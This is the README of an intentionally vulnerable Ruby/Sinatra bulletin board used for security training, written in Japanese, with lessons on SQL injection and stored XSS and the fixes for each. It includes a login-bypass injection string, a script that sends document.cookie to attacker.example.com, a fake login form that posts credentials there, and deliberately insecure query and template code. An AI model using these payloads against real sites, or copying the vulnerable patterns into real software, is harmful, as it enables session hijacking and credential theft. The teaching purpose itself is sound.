# 脆弱性学習用 掲示板アプリ

セキュリティの脆弱性を**手を動かして学ぶ**ための掲示板アプリケーション。
意図的に脆弱性を仕込んだコードに対して、実際に攻撃 → 理解 → 防御のサイクルで学習する。

> **警告**: このアプリは学習目的で意図的に脆弱性を含んでいます。本番環境やインターネットに公開された環境では絶対に使用しないでください。

## 技術スタック

- Ruby 3.3 + Sinatra（軽量Webフレームワーク）
- SQLite3（データベース）
- ERB（テンプレートエンジン）
- 外部サービス不要、ローカルで完結

## セットアップ

```bash
cd vulnerable-board

# 依存関係のインストール
bundle install

# データベースの初期化（テスト用ユーザー・投稿を作成）
ruby db/setup.rb

# サーバー起動
ruby app.rb
```

http://localhost:4567 にアクセス。

### テスト用アカウント

| ユーザー名 | パスワード |
|-----------|-----------|
| admin | password123 |
| alice | alice456 |

## 学習カリキュラム

各回ごとに「脆弱なコードで攻撃を体験 → なぜ成功するか理解 → 安全なコードに修正 → 再攻撃して防げることを確認」のサイクルで進める。

| 回 | 機能 | 脆弱性 | 攻撃例 | 状態 |
|----|------|--------|--------|------|
| 1 | ログイン | SQLインジェクション | `' OR 1=1 --` でログイン突破 | 実装済み |
| 2 | 投稿表示 | XSS | `<script>alert('XSS')</script>` を投稿 | 実装済み |
| 3 | 投稿削除 | CSRF | 罠サイトから他人の投稿を削除 | 未実装 |
| 4 | アイコンアップロード | ディレクトリトラバーサル | `../../etc/passwd` 的なファイル名 | 未実装 |
| 5 | セッション管理 | 認証の不備 | 推測可能なセッションID | 未実装 |

## 第1回: SQLインジェクション

### 脆弱な箇所

`app.rb` のログイン処理（`post '/login'`）で、ユーザー入力を直接SQL文に埋め込んでいる。

```ruby
# 脆弱なコード
query = "SELECT * FROM users WHERE username = '#{username}' AND password = '#{password}'"
```

### 攻撃してみる

1. http://localhost:4567/login にアクセス
2. ユーザー名に `' OR 1=1 --` と入力
3. パスワードは何でもOK
4. ログインボタンを押す → **admin としてログインできてしまう**

ターミナルに出力されるSQL文を確認すると、なぜ突破できたか分かる：

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'
```

- `'` で文字列リテラルを閉じる
- `OR 1=1` で常に真の条件を追加
- `--` 以降がコメントになり、パスワード検証が無視される

### 防御方法

プレースホルダ（パラメータバインド）を使う：

```ruby
# 安全なコード
user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", [username, password]).first
```

ユーザー入力がSQL構文として解釈されなくなるため、インジェクションが成立しない。

## 第2回: XSS（クロスサイトスクリプティング）

### 脆弱な箇所

`views/posts.erb` の投稿表示で、ユーザー入力をエスケープせずにHTMLに出力している。

```erb
<%# 脆弱なコード — エスケープなしで出力 %>
<div class="post-body"><%= post['body'] %></div>
```

SinatraのERBでは `<%= ... %>` はHTMLエスケープを**行わない**。そのため、投稿に含まれる `<script>` タグなどがそのままブラウザで実行される。

> **注意**: Ruby on Railsでは `<%= ... %>` は自動エスケープされるが、素のERB（Sinatra）では自動エスケープされない。

### 攻撃してみる

1. http://localhost:4567/login にアクセスし、ログイン
2. 投稿欄に `<script>alert('XSS')</script>` と入力して投稿
3. **アラートが表示される** = XSS脆弱性が存在する

### 攻撃のバリエーション

**Cookie窃取（セッションハイジャック）:**

```html
<script>new Image().src='http://attacker.example.com/steal?cookie='+document.cookie;</script>
```

攻撃者のサーバーに被害者のセッションCookieが送信され、なりすましが可能になる。

**偽のログインフォーム表示（フィッシング）:**

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
  <h1>セッションが切れました。再ログインしてください。</h1>
  <form action="http://attacker.example.com/phish" method="post">
    <input name="username" placeholder="ユーザー名">
    <input name="password" type="password" placeholder="パスワード">
    <button type="submit">ログイン</button>
  </form>
</div>
```

### 仕組み（なぜ成功するか）

```
1. 攻撃者が <script>悪意のあるコード</script> を投稿
2. DBにそのまま保存される（エスケープなし）
3. 他のユーザーが投稿一覧ページを閲覧
4. サーバーが <%= post['body'] %> でHTMLに埋め込む（エスケープなし）
5. ブラウザが <script> タグを正規のスクリプトとして実行
   → Cookie漏洩、画面改ざん、リダイレクトなどが起きる
```

このタイプのXSSは**格納型XSS（Stored XSS）**と呼ばれる。DBに保存されたスクリプトが閲覧者全員に影響する、最も危険なXSSの一種。

### 防御方法

出力時にHTMLの特殊文字をエスケープする：

```erb
<%# 安全なコード — エスケープして出力 %>
<div class="post-body"><%= Rack::Utils.escape_html(post['body']) %></div>
```

エスケープにより、特殊文字が無害な文字列に変換される：

| 元の文字 | エスケープ後 |
|---------|------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

`<script>` は `&lt;script&gt;` となり、ブラウザには「タグ」ではなく「文字列」として表示される。

## ディレクトリ構成

```
vulnerable-board/
├── Gemfile              # 依存関係
├── app.rb               # メインアプリ（Sinatra）
├── views/
│   ├── layout.erb       # 共通レイアウト
│   ├── login.erb        # ログイン画面
│   ├── register.erb     # ユーザー登録画面
│   ├── posts.erb        # 投稿一覧（掲示板）
│   └── profile.erb      # プロフィール
├── public/
│   └── uploads/         # アップロード画像（第4回で使用）
└── db/
    ├── setup.rb         # DB初期化スクリプト
    └── board.db         # SQLiteデータベース
```
